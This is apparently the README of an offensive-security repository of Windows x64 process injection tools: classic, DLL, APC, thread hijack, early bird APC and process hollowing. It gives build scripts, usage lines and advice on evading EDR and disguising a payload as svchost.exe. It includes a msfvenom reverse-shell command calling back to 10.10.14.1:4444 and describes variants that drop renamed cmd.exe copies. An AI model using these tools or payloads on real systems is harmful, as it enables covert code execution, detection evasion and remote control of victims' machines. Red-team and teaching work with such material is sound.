# Process Injection

Six different ways to get code running inside a target Windows process, plus a local test harness. All examples target **x64**.

**MITRE ATT&CK**: T1055

## Techniques at a glance

The six primary techniques solve the same problem - "run my code inside that other process" - but each one takes a different path. Pick based on what matters: stealth, reliability, or how the target shows up in Task Manager.

| Technique | One-line summary | New thread? | Guaranteed to fire? | ATT&CK |
|---|---|---|---|---|
| **Classic** (`classic_injection.cpp`) | Spawn a brand-new thread in the target whose entry point is your shellcode. | yes (visible) | yes | T1055.002 |
| **DLL Injection** (`dll_injection.cpp`) | Make the target call `LoadLibraryA("your.dll")` inside its own address space. | yes (short-lived) | yes | T1055.001 |
| **APC** (`apc_injection.cpp`) | Queue your shellcode as an APC on every existing thread. Fires when one hits an alertable wait. | no | no (may never fire) | T1055.004 |
| **Thread Hijack** (`thread_hijack.cpp`) | Freeze a running thread of the target, swap its RIP to your shellcode, resume. | no | yes | T1055.003 |
| **Early Bird APC** (`early_bird_apc.cpp`) | Spawn a new process suspended, queue APC on its primary thread, resume. Fires in `LdrInitializeThunk`. | no (reuses the primary) | yes | T1055.004 variant |
| **Process Hollowing** (`process_hollowing.cpp`) | Spawn a legit-looking host (`svchost.exe`), erase its code, map your full PE into the same address, resume. | no (reuses the primary) | yes | T1055.012 |

Plus `shellcode_runner.cpp` - runs shellcode inside ITSELF, not a remote target. Just a quick harness to validate your shellcode works before trying to inject it anywhere.

## How to pick one

```
I want the simplest shellcode delivery.
    -> classic_injection

I have a .DLL payload with full C/C++ logic (reverse shell, hook library, ...).
    -> dll_injection  (paired with the DLL in ../process-injection-2/)

I want NO new thread to appear in the target (EDR evasion).
    -> apc_injection         (if willing to roll the dice on alertable waits)
    -> thread_hijack         (if you want it to actually fire)

I want to spawn a brand-new process that runs my shellcode before anything else.
    -> early_bird_apc        (the new process looks like notepad.exe, chrome.exe, etc.)

I want the running process to appear in Task Manager as svchost.exe / a system service.
    -> process_hollowing     (most work to implement, most convincing result)

I just want to test whether my shellcode even works.
    -> shellcode_runner      (no injection, runs in-process)
```

## Each file in detail

| File | What it actually does | ATT&CK |
|------|-----------------------|--------|
| [`classic_injection.cpp`](classic_injection.cpp) | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread(entry = shellcode)`. The visible new thread is the trade-off. | T1055.002 |
| [`dll_injection.cpp`](dll_injection.cpp) | Write a DLL path into the target, then `CreateRemoteThread(entry = LoadLibraryA)`. The target's own loader does the heavy lifting. | T1055.001 |
| [`apc_injection.cpp`](apc_injection.cpp) | `QueueUserAPC` your shellcode on every thread of the live target. Any one of them hitting an alertable wait fires it. | T1055.004 |
| [`thread_hijack.cpp`](thread_hijack.cpp) | `SuspendThread` on an existing target thread, `SetThreadContext` to replace its RIP with the shellcode address, `ResumeThread`. The thread never returns to its original work. | T1055.003 |
| [`early_bird_apc.cpp`](early_bird_apc.cpp) | `CreateProcess(CREATE_SUSPENDED)` a host (e.g. notepad.exe), `QueueUserAPC` on the primary thread, `ResumeThread`. The APC fires inside `ntdll!LdrInitializeThunk`, before the host's own entry point runs. | T1055.004 variant |
| [`process_hollowing.cpp`](process_hollowing.cpp) | `CreateProcess SUSPENDED` -> `NtUnmapViewOfSection` -> map YOUR payload PE into the same base (with relocations + imports fixed up) -> `SetThreadContext(entry)` -> `ResumeThread`. | T1055.012 |
| [`shellcode_runner.cpp`](shellcode_runner.cpp) | Local only: `VirtualAlloc(RW)` -> copy shellcode -> `VirtualProtect(RX)` -> jump. If your shellcode will not pop calc here, it will not pop calc anywhere. | T1055 base |

## The "v2" variants

Each technique above has a `_v2.cpp` sibling. All v2 variants do the SAME thing their v1 does, plus one extra step: they drop a renamed copy of a system binary (usually `cmd.exe`) and patch its `FileDescription` resource string before delivering the payload, so the child process shows up in Task Manager with a custom name instead of looking generic.

| v2 file | Drops on disk as | Shows in Task Manager as |
|---|---|---|
| `classic_injection_v2.cpp` | `C:\Users\Public\RevShell_C.exe` | `RevShell-ClassicInj` |
| `apc_injection_v2.cpp` | `C:\Users\Public\RevShell_A.exe` | `RevShell-APC Inject` |
| `dll_injection_v2.cpp` | (the identifier is baked into the paired DLL) | `RevShell - WinCmd Proc` |
| `process_hollowing_v2.cpp` | `C:\Users\Public\RevShell_H.exe` (renamed host) | `RevShell-Hollow Proc` |
| `shellcode_runner_v2.cpp` | the runner EXE itself, with a VERSIONINFO `.rc` | `RevShell Runner` |

Use v2 when you want a visible, identifiable PoC artefact for a screenshot or report. Use v1 when you just want the technique.

All shellcode-based injectors (classic, apc, thread_hijack, early_bird_apc) use `EXITFUNC=thread` so the target process survives after the payload runs. Default payload = `WinExec("calc.exe", 0)`.

## Build (Linux cross-compile)

### Easiest: the interactive script

```bash
chmod +x build_injectors.sh
./build_injectors.sh
```

What it does:

- Lists all 10 injector sources in a numbered menu. Pick one, several (comma-separated), or `all`.
- Asks for arch: `1) x64`, `2) x86`, `3) both`.
- Auto-installs `mingw-w64` with `sudo apt` if missing (idempotent).
- Downloads any missing `.cpp` from the GitHub raw URL (so the script works standalone too, not just from the cloned repo).
- Handles `shellcode_runner_v2` automatically: compiles the `.rc` with `windres` first, then links it.
- Writes each binary as `<name>_<arch>.exe` next to the script, for example `inject_x64.exe`, `dll_inject_x86.exe`.
- Remembers your last selection and arch in `build_injectors.conf`, so pressing Enter twice rebuilds the same set next time.

Nothing network-related in these injectors: they take the target PID or name at runtime, so there is no LHOST or LPORT to bake in or validate.

### Manual one-liner

```bash
sudo apt install -y mingw-w64 && \
  for f in classic_injection apc_injection dll_injection process_hollowing shellcode_runner; do \
    x86_64-w64-mingw32-g++ -std=c++20 -o $f.exe $f.cpp -lpsapi; \
  done
```

## Build (Windows MSVC)

In the x64 Native Tools Command Prompt for VS 2022:

```
cl /std:c++20 classic_injection.cpp  /Fe:inject.exe
cl /std:c++20 dll_injection.cpp      /Fe:dll_inject.exe  psapi.lib
cl /std:c++20 apc_injection.cpp      /Fe:apc_inject.exe
cl /std:c++20 process_hollowing.cpp  /Fe:hollow.exe
cl /std:c++20 shellcode_runner.cpp   /Fe:runner.exe
```

## Usage

```
inject.exe       <PID|name>                 # shellcode -> target (calc pops, target survives)
dll_inject.exe   <PID> <absolute DLL path>  # DLL loaded in target, verified via module list
apc_inject.exe   <PID>                      # APC sprayed on all threads
hollow.exe       <payload.exe> [host.exe]   # host hollowed with payload (default host: svchost.exe)
runner.exe       [shellcode.bin] [thread]   # local shellcode test (self-injection)
```

## Customizing the payload

Replace the embedded shellcode in `classic_injection.cpp` or `apc_injection.cpp`:

```bash
# calc pop (safe for demo)
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c

# reverse shell
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.10.14.1 LPORT=4444 \
         EXITFUNC=thread -f c
```

**Always use `EXITFUNC=thread`.** The default `EXITFUNC=process` calls `ExitProcess()` on the target host after the payload runs - your target crashes.

## When to use each

| Technique | Pros | Cons |
|-----------|------|------|
| **Classic (CreateRemoteThread)** | Reliable, works on most processes | New thread with unbacked RWX start address is a loud EDR signal |
| **DLL Injection** | Payload is a compiled DLL (easier to write complex logic) | DLL on disk; `LoadLibrary` triggers ETW `ImageLoad` events |
| **APC Injection** | No new thread created | Only fires when a target thread enters an alertable wait |
| **Process Hollowing** | Payload runs under a legitimate process name | Complex (relocations + imports), unusual process-tree pattern |
| **Shellcode Runner** (self-injection) | Simplest shellcode test; validates msfvenom output before injection | Not a remote-injection primitive |

## v2 variants - identifiable child in Task Manager

The v1 files above spawn the generic shellcode payload (default `calc.exe`) - looks identical to any normal calc. **v2** variants pre-rename a system binary and patch its `FileDescription` so the child shows up in Task Manager with a custom name:

| File | What it drops | Big text (FileDescription) | Image name |
|---|---|---|---|
| [`classic_injection_v2.cpp`](classic_injection_v2.cpp) | `C:\Users\Public\RevShell_C.exe` | `RevShell-ClassicInj` | `RevShell_C.exe` |
| [`apc_injection_v2.cpp`](apc_injection_v2.cpp) | `C:\Users\Public\RevShell_A.exe` | `RevShell-APC Inject` | `RevShell_A.exe` |
| [`dll_injection_v2.cpp`](dll_injection_v2.cpp) | (depends on the DLL - reference: `../process-injection-2/revshell_pure_dll.dll`) | `RevShell - WinCmd Proc` | `revShell.exe` |
| [`process_hollowing_v2.cpp`](process_hollowing_v2.cpp) | `C:\Users\Public\RevShell_H.exe` (renamed host) | `RevShell-Hollow Proc` | `RevShell_H.exe` |
| [`shellcode_runner_v2.cpp`](shellcode_runner_v2.cpp) + [`.rc`](shellcode_runner_v2.rc) | the runner itself | `RevShell Runner` | `runner_v2.exe` |

Build v2 the same way as v1 (plus a resource compile step for `shellcode_runner_v2`):

```bash
# Linux cross-compile
for f in classic_injection_v2 apc_injection_v2 process_hollowing_v2; do
  x86_64-w64-mingw32-g++ -std=c++20 -o $f.exe $f.cpp
done
x86_64-w64-mingw32-g++ -std=c++20 -o dll_inject_v2.exe dll_injection_v2.cpp -lpsapi
x86_64-w64-mingw32-windres shellcode_runner_v2.rc -o rc.o
x86_64-w64-mingw32-g++ -std=c++20 -o runner_v2.exe shellcode_runner_v2.cpp rc.o
```

The identifier approach used by each v2 variant:

- **Shellcode injectors (classic, APC)**: hand-crafted ~45-byte x64 shellcode calls `WinExec(renamed_path, SW_SHOWNORMAL)`. The injector pre-copies cmd.exe and patches its VERSIONINFO before firing.
- **DLL injection**: identifier logic lives inside the loaded DLL (reference: [`../process-injection-2/revshell_pure_dll.dll`](../process-injection-2/)). The v2 injector just loads any identifier-aware DLL.
- **Process hollowing**: renames and patches the host binary before `CreateProcess SUSPENDED`. The hollow runs under the custom name.
- **Shellcode runner**: the runner itself gets a custom VERSIONINFO via `.rc` - Task Manager Processes tab shows the runner as `"RevShell Runner"`.

## Legal

Authorized testing only.
